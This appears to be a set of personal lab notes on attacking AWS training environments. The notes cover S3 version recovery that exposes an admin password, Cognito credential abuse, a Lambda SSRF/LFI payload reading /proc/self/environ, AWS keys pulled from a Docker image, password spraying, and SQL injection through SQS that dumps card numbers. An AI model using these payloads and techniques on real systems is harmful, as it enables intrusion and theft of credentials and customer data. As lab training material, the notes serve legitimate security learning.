x-amz-version-id: j2hElDSlveHRMaivuWldk8KSrC.vIONW
Accept-Ranges: bytes
Content-Type: application/javascript
Content-Length: 244
Server: AmazonS3
```

List versions with the below command. Note the delete marker and also how the file `auth.js` shows up twice (2 versions)
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3api list-object-versions --bucket huge-logistics-dashboard --no-sign-request 
{
    "Versions": [
        {
            "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "private/",
            "VersionId": "LFkKXfYHprr7YC4BgFt5BbQPLLZWfu0B",
            "IsLatest": true,
            "LastModified": "2023-08-16T18:25:59.000Z",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
<snip>
{
            "ETag": "\"c3d04472943ae3d20730c1b81a3194d2\"",
            "Size": 244,
            "StorageClass": "STANDARD",
            "Key": "static/js/auth.js",
            "VersionId": "j2hElDSlveHRMaivuWldk8KSrC.vIONW",
            "IsLatest": true,
            "LastModified": "2023-08-12T20:43:43.000Z",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        },
        {
            "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
            "Size": 463,
            "StorageClass": "STANDARD",
            "Key": "static/js/auth.js",
            "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
            "IsLatest": false,
            "LastModified": "2023-08-12T19:13:25.000Z",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
<snip>
   "IsLatest": true,
            "LastModified": "2023-08-12T19:09:34.000Z",
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            }
        }
    ],
    "DeleteMarkers": [
        {
            "Owner": {
                "ID": "34c9998cfbce44a3b730744a4e1d2db81d242c328614a9147339214165210c56"
            },
            "Key": "private/Business Health - Board Meeting (Confidential).xlsx",
            "VersionId": "whIGcxw1PmPE1Ch2uUwSWo3D5WbNrPIR",
            "IsLatest": true,
            "LastModified": "2023-08-16T19:12:39.000Z"
        }
<snip>
```

Download previous versions like this
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3api get-object --bucket huge-logistics-dashboard --key 'static/js/auth.js' --version-id 'qgWpDiIwY05TGdUvTnGJSH49frH_7.yh' auth.js --no-sign-request                    
{
    "AcceptRanges": "bytes",
    "LastModified": "Sat, 12 Aug 2023 19:13:25 GMT",
    "ContentLength": 463,
    "ETag": "\"7b63218cfe1da7f845bfc7ba96c2169f\"",
    "VersionId": "qgWpDiIwY05TGdUvTnGJSH49frH_7.yh",
    "ContentType": "application/javascript",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ cat auth.js                                                                           
$(document).ready(function(){
    $(".btn-login").on("click", login);
});

function login(){
    email = $('#emailForm')[0].value;
    password = $('#passwordForm')[0].value;
    data = {'email':email, 'password':password};
    doLogin(data);
}
//Please remove this after testing. Password change is not necessary to implement so keep this secure!
function test_login(){
        data = {'email':'admin@huge-logistics.com', 'password':'H4mpturTiem213!'}
        doLogin(data);
}
```

---

You can get an Account ID from an access key ID with
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sts get-access-key-info --access-key-id AKIAWHEOTHRFVXYV44WP
{
    "Account": "427648302155"
}
```

---

Look for public snapshots of single RDS databases (no hits) or RDS database cluster instances and grep for the target account ID
```
┌──(kali㉿kali)-[~]
└─$ aws rds describe-db-snapshots --snapshot-type public --include-public --region us-east-1 | grep 104506445608
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ aws rds describe-db-cluster-snapshots --snapshot-type public --include-public --region us-east-1 | grep 104506445608
            "DBClusterSnapshotIdentifier": "arn:aws:rds:us-east-1:104506445608:cluster-snapshot:orders-private",
            "DBClusterSnapshotArn": "arn:aws:rds:us-east-1:104506445608:cluster-snapshot:orders-private",
```

There's an `orders-private` database cluster. In the AWS Console select the appropriate region and browse to Aurora and RDS > Snapshots > Public to restore it. The UI should be intuitive enough. Select the new database and set up an EC2 connection

If you don't know the database password after spinning up the EC2 instance, it's possible to modify it from the Databases menu. Install postgresql-client on it and access the database snapshot

---

Knowing a Cognito identity pool ID, we can request an Identity ID if it is configured to support unauthenticated identities. With the Identity ID, request credentials for it
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-identity get-id --identity-pool-id us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367 --no-sign
{
    "IdentityId": "us-east-1:6391d33c-4bb8-ca6a-0338-67c93f4d4342"
}

┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:6391d33c-4bb8-ca6a-0338-67c93f4d4342 --no-sign
{
    "IdentityId": "us-east-1:6391d33c-4bb8-ca6a-0338-67c93f4d4342",
    "Credentials": {
        "AccessKeyId": "ASIAWHEOTHRFQZSHBVZP",
        "SecretKey": "uN6gw....
<snip>

┌──(kali㉿kali)-[~/Desktop]
└─$ nano ~/.aws/credentials
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sts get-caller-identity --profile pwnedlabs                                                                     
{
    "UserId": "AROAWHEOTHRFRYHGIQFVK:CognitoIdentityCredentials",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppUnauth_Role/CognitoIdentityCredentials"
}
```

In this lab, an S3 bucket name was leaked and the provided Cognito Identity Credentials grant access to it
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws s3 ls s3://hl-app-images/temp/ --profile pwnedlabs
2023-07-15 14:10:54          0 
2023-07-15 14:11:22       3428 id_rsa
```

There is also a Cognito-hosted web UI for a web app that includes the Client ID `16f1g98bfuj9i0g3f8be36kkrl`. Cognito's CLI documentation can be found <a href="https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/#cli-aws-cognito-idp">here</a>

Sign up with the following command (extra points for user enumeration!)
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username test --password 'Password123!' --profile pwnedlabs --region us-east-1
An error occurred (UsernameExistsException) when calling the SignUp operation: User already exists
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username bc --password 'Password123!' --profile pwnedlabs --region us-east-1  
{
    "UserConfirmed": false,
    "UserSub": "78355146-8ae9-4e7d-ba57-78fb5306e198"
}
```

We cannot login because the user is not confirmed. Pass the following arguments in a new registration command to be able to confirm the user. A 10minutemail was used for this
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-idp sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username bc2 --password 'Password123!' --user-attributes Name="email",Value="ynxsdihnpqfvmcuyeo@nespj.com" Name="name",Value="Test"
{
    "UserConfirmed": false,
    "CodeDeliveryDetails": {
        "Destination": "y***@n***",
        "DeliveryMedium": "EMAIL",
        "AttributeName": "email"
    },
    "UserSub": "627bb320-e25c-491e-9b8f-41d7e33a8074"
}

┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-idp confirm-sign-up --client-id 16f1g98bfuj9i0g3f8be36kkrl --username bc2 --confirmation-code 140476

┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-idp initiate-auth --client-id 16f1g98bfuj9i0g3f8be36kkrl --auth-flow USER_PASSWORD_AUTH --auth-parameters USERNAME=bc2,PASSWORD=Password123!
{
    "ChallengeParameters": {},
    "AuthenticationResult": {
        "AccessToken": "eyJraWQiOiJDTFRKamV3bm5sT3BXTmxzOTZhbW1veEt...
<snip>
```

Get a unique Identity ID and request credentials
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-identity get-id --identity-pool-id "us-east-1:d2fecd68-ab89-48ae-b70f-44de60381367" --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"

┌──(kali㉿kali)-[~/Desktop]
└─$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:ee941406-f70b-4ff3-8e3f-a9f2eb32454b --logins "{ \"cognito-idp.us-east-1.amazonaws.com/us-east-1_8rcK7abtz\": \"<token>\" }"
```

Configure AWS credentials and proceed with typical enumeration
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sts get-caller-identity                                        
{
    "UserId": "AROAWHEOTHRFZ7HQ7Z6QA:CognitoIdentityCredentials",
    "Account": "427648302155",
    "Arn": "arn:aws:sts::427648302155:assumed-role/Cognito_StatusAppAuth_Role/CognitoIdentityCredentials"
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws iam list-role-policies --role-name Cognito_StatusAppAuth_Role
{
    "PolicyNames": [
        "oneClick_Cognito_StatusAppAuth_Role_1689349464673"
    ]
}
```

---

Below we enumerate the lambda function. Download the code with the URL at the end of the output
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws lambda get-function --function-name huge-logistics-status 
{
    "Configuration": {
        "FunctionName": "huge-logistics-status",
        "FunctionA
<snip>
},
    "Code": {
        "RepositoryType": "S3",
        "Location": "https://prod-iad-c1-djusa-tasks.s3.us-east-1.amazonaws.com/snapshots/427648302155/huge-logistics-status-ebb6abbc-63...
    }
```

This functions is vulnerable to an SSRF vulnerability. Exploit it with an LFI to steal credentials
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws lambda invoke --function-name huge-logistics-status --payload '{"target" : "file:///proc/self/environ"}' out.json
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ cat out.json| grep -i 'aws'                                                                                          
{"statusCode": null, "statusMessage": "Service is not available.", "body": "AWS_LAMBDA_FUNCTION_VERSION=$LATEST\u0000AWS_SEe...
<snip>
```

---

You can use <a href="https://hub.docker.com/">Docker Hub</a> to search for docker images related to the target

<p align="center">
  <img width="60%" src="https://github.com/user-attachments/assets/00e60925-8cff-474c-893d-6059df86f98f"/>
</p>


Use the `Docker Scout` plugin for quick CVE analysis of the Docker image
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo docker scout cves hljose/huge-logistics-terraform-runner:0.12
    ✓ Image stored for indexing
    ✓ Indexed 88 packages
    ✗ Detected 17 vulnerable packages with a total of 83 vulnerabilities

## Overview
                    │                Analyzed Image                  
────────────────────┼────────────────────────────────────────────────
  Target            │  hljose/huge-logistics-terraform-runner:0.12   
    digest          │  31bd0544dff8                                  
    platform        │ linux/amd64                                    
    vulnerabilities │    7C    24H    44M     8L     1?              
    size            │ 62 MB                                          
    packages        │ 88                                             


## Packages and Vulnerabilities
   2C     4H     9M     4L  curl 8.2.0-r0
pkg:apk/alpine/curl@8.2.0-r0?os_name=alpine&os_version=3.18

    ✗ CRITICAL CVE-2025-0665
      https://scout.docker.com/v/CVE-2025-0665
      Affected range : <8.12.0-r0  
      Fixed version  : 8.12.0-r0   
    
    ✗ CRITICAL CVE-2023-38545
      https://scout.docker.com/v/CVE-2023-38545
<snip>
   1C     3H    11M     0L  openssl 3.1.1-r1
pkg:apk/alpine/openssl@3.1.1-r1?os_name=alpine&os_version=3.18

    ✗ CRITICAL CVE-2024-5535
      https://scout.docker.com/v/CVE-2024-5535
      Affected range : <3.1.6-r0  
      Fixed version  : 3.1.6-r0   
<snip>
```

Interact with the Docker image with
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo docker run -i -t hljose/huge-logistics-terraform-runner:0.12 /bin/bash
5434198e53c7:/# uname -a
Linux 5434198e53c7 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64 Linux
```

Either print the environmental variables from the shell or run `docker inspect` to find AWS credentials
```
┌──(kali㉿kali)-[~/Desktop]
└─$ sudo docker inspect hljose/huge-logistics-terraform-runner:0.12             
[
    {
        "Id": "sha256:31bd0544dff85f0a97bd52a724215e77244733a3f51fe051928009da08df1de9",
<snip>
            "AttachStderr": false,
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "AWS_ACCESS_KEY_ID=AKIA3NRSK2PTOA5KVIUF",
                "AWS_SECRET_ACCESS_KEY=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",
                "AWS_DEFAULT_REGION=us-east-1"
            ],
<snip>
```

---

Enumerating CodeCommit
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws-enumerator dump -services codecommit                        
----------------------------- CODECOMMIT -----------------------------
ListRepositories
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ aws codecommit list-repositories                                
{
    "repositories": [
        {
            "repositoryName": "vessel-tracking",
            "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3"
        }
    ]
}
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ aws codecommit get-repository --repository-name vessel-tracking 
{
    "repositoryMetadata": {
        "accountId": "785010840550",
        "repositoryId": "beb7df6c-e3a2-4094-8fc5-44451afc38d3",
        "repositoryName": "vessel-tracking",
        "repositoryDescription": "Vessel Tracking App",
        "defaultBranch": "master",
        "lastModifiedDate": 1689875446.826,
        "creationDate": 1689801079.845,
        "cloneUrlHttp": "https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "cloneUrlSsh": "ssh://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking",
        "Arn": "arn:aws:codecommit:us-east-1:785010840550:vessel-tracking",
        "kmsKeyId": "alias/aws/codecommit"
    }
}
```

Specific repository enumeration... The `fileContent` variable is base64-encoded. Decode it for AWS credentials
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws codecommit list-branches --repository-name vessel-tracking
{
    "branches": [
        "master",
        "dev"
    ]
}
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ aws codecommit get-branch --repository-name vessel-tracking --branch-name dev
{
    "branch": {
        "branchName": "dev",
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a"
    }
}
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a
{
    "commit": {
        "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
        "treeId": "5718a0915f230aa9dd0292e7f311cb53562bb885",
        "parents": [
            "2272b1b6860912aa3b042caf9ee3aaef58b19cb1"
        ],
        "message": "Allow S3 call to work universally\n",
        "author": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "committer": {
            "name": "Jose Martinez",
            "email": "jose@pwnedlabs.io",
            "date": "1689875383 +0100"
        },
        "additionalData": ""
    }
}

┌──(kali㉿kali)-[~/Desktop]
└─$ aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a
{
    "differences": [
        {
            "beforeBlob": {
                "blobId": "4381be5cc1992c598de5b7a6b73ebb438b79daba",
                "path": "js/server.js",
                "mode": "100644"
            },
            "afterBlob": {
                "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
                "path": "js/server.js",
                "mode": "100644"
            },
            "changeType": "M"
        }
    ]
}
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js
{
    "commitId": "b63f0756ce162a3928c4470681cf18dd2e4e2d5a",
    "blobId": "39bb76cad12f9f622b3c29c1d07c140e5292a276",
    "filePath": "js/server.js",
    "fileMode": "NORMAL",
    "fileSize": 1702,
    "fileContent": "Y29uc3QgZXhwcmVzcyA9IHJlcXVpcmUoJ2V4cHJlc
<snip>
```

---

Enumerating DynamoDB
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws dynamodb list-tables                    
{
    "TableNames": [
        "analytics_app_users",
        "user_order_logs"
    ]
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws dynamodb describe-table --table-name user_order_logs
An error occurred (AccessDeniedException) when calling the DescribeTable operation: User: arn:aws:iam::243687662613:user/migration-test is not authorized....
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws dynamodb describe-table --table-name analytics_app_users
{
    "Table": {
        "AttributeDefinitions": [
            {
                "AttributeName": "UserID",
                "AttributeType": "S"
            }
        ],
        "TableName": "analytics_app_users",
        "KeySchema": [
            {
                "AttributeName": "UserID",
                "KeyType": "HASH"
            }
        ],
        "TableStatus": "ACTIVE",
        "CreationDateTime": 1691612596.704,
        "ProvisionedThroughput": {
            "NumberOfDecreasesToday": 0,
            "ReadCapacityUnits": 0,
            "WriteCapacityUnits": 0
        },
        "TableSizeBytes": 7734,
        "ItemCount": 51,
        "TableArn": "arn:aws:dynamodb:us-east-1:243687662613:table/analytics_app_users",
        "TableId": "6568c0bb-bdf7-4380-877c-05b7826505ad",
        "BillingModeSummary": {
            "BillingMode": "PAY_PER_REQUEST",
            "LastUpdateToPayPerRequestDateTime": 1691612596.704
        },
        "TableClassSummary": {
            "TableClass": "STANDARD"
        },
        "DeletionProtectionEnabled": true,
        "WarmThroughput": {
            "ReadUnitsPerSecond": 12000,
            "WriteUnitsPerSecond": 4000,
            "Status": "ACTIVE"
        }
    }
}
```

Then use `aws dynamodb scan --table-name analytics_app_users` to dump the contents

---

Use `GoAWSConsoleSpray` for credential spraying
```
┌──(kali㉿kali)-[~/Desktop]
└─$ GoAWSConsoleSpray -a 243687662613 -u users1 -p passwords1           
2025/10/25 12:30:00 GoAWSConsoleSpray: [18] users loaded. [18] passwords loaded. [324] potential login requests.
2025/10/25 12:30:00 Spraying User: arn:aws:iam::243687662613:user/jyoshida
2025/10/25 12:30:11 Spraying User: arn:aws:iam::243687662613:user/vkawasaki
<snip>
2025/10/25 12:30:57 Spraying User: arn:aws:iam::243687662613:user/rstead
2025/10/25 12:31:01 (rstead)    [+] SUCCESS:    Valid Password: Abc123!!        MFA: false
<snip>
```

---

You can invoke functions without having special permissions, here we only have `ListFunctions`
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws lambda invoke --function-name huge-logistics-stock out
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop]
└─$ cat out       
{"statusCode": 200, "body": "\"Invalid event parameter!\""}
```

The parameter can be brute forced, Param Miner style. My script takes a hardcoded wordlist and only prints the output if it doesn't contain the "Invalid event parameter!" string
```
┌──(kali㉿kali)-[~/Desktop]
└─$ python3 try.py
[+] Word: DESC
{"statusCode": 500, "error": "Invalid trackingID, refer to queue"}
```

We also have SQS permissions, this 
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sqs list-queues                                                                                
{
    "QueueUrls": [
        "https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics"
    ]
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sqs receive-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics               
{
    "Messages": [
        {
            "MessageId": "01db93d6-ce0b-44a2-9fa3-baa6aafc8f28",
            "ReceiptHandle": "AQEBDb6SjFFQEUJCk2Ynua....
            "MD5OfBody": "1c9429682ec6e97f45a2283605ee8bf9",
            "Body": "EY shipped package of 418kg",
            "MD5OfMessageAttributes": "092ab012001f7494fdaa78c1078e6918",
            "MessageAttributes": {
                "Client": {
                    "StringValue": "EY",
                    "DataType": "String"
                },
                "Weight": {
                    "StringValue": "418",
                    "DataType": "Number"
                },
                "trackingID": {
                    "StringValue": "HLT2073",
                    "DataType": "String"
                }
            }
        }
    ]
}
```

We can craft our own SQS message and send it to the queue. Later we can invoke the Lambda function to track the item
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"idontexist", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "Testing"
{
    "MD5OfMessageBody": "fa6a5a3224d7da66d9e0bdec25f62cf0",
    "MD5OfMessageAttributes": "a7a15567ca78a433555e2c56733bf18b",
    "MessageId": "ed64479b-f7d2-490d-aea2-e8b29ba365fd"
}
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop]
└─$ aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output && cat output
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
[]
```

Note how sending an extra double quotes character in the client name breaks the DB. SQL injection!
```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws sqs send-message --queue-url https://eu-north-1.queue.amazonaws.com/254859366442/huge-analytics --message-attributes '{ "Weight": { "StringValue": "1337", "DataType":"Number"}, "Client": {"StringValue":"idontexist\"", "DataType": "String"}, "trackingID": {"StringValue":"HLT1337", "DataType":"String"}}' --message-body "Testing"
{
    "MD5OfMessageBody": "fa6a5a3224d7da66d9e0bdec25f62cf0",
    "MD5OfMessageAttributes": "478444444b20a98a6f3bb11ad3010382",
    "MessageId": "414139af-87fe-4db7-9643-38514232d065"
}

┌──(kali㉿kali)-[~/Desktop]
└─$ aws lambda invoke --function-name huge-logistics-stock --payload "{\"DESC\":\"HLT1337\"}" output && cat output
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
"DB error" 
```

With a script that builds the command with an injected payload passed as a parameter, keep enumerating the DB
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./exploit.sh "UNION SELECT null, null, null, @@version;-- -"                        
[{"trackingID": "HLT1356", "clientName": "VELUS CORP.", "packageWeight": 75, "delivered": "0"}, {"trackingID": "HLT1378", "clientName": "VELUS CORP.", "packageWeight": 80, "delivered": "0"}, {"trackingID": "HLT4080", "clientName": "VELUS CORP.", "packageWeight": 9525, "delivered": "0"}, {"trackingID": null, "clientName": null, "packageWeight": null, "delivered": "8.0.42"}]

<snip>

┌──(kali㉿kali)-[~/Desktop]
└─$ ./exploit.sh "UNION SELECT null, null, null, CONCAT(clientName,':',address,':',cardUsed) FROM customerData-- -"                
Adidas:56 Claremont Court:5133110655169130
EY:3 Farmco Parkway:4913444258211042
Google Inc.:559 Ohio Lane:3532085972424818
VELUS CORP.:e46fbfe64cf7e50be097005f2de8b227:3558615975963377
```

<br>

## HTB Fortress: AWS

I was super excited when I started this Fortress. After so many labs and exercises, this seemed like the final boss where I could combine everything I knew in one huge challenge. Due to Hack The Box's policy I cannot give you a walkthrough, but I'll still add notes if I face something new

tbd
